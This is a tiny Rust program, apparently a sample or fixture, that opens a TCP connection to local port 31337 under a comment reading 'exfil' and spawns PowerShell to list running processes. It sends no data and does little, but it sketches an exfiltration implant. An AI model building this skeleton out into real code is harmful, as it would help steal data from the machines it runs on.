use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("127.0.0.1:31337") { /* exfil */ }
    Command::new("powershell").arg("-Command").arg("Get-Process").spawn().ok();
}
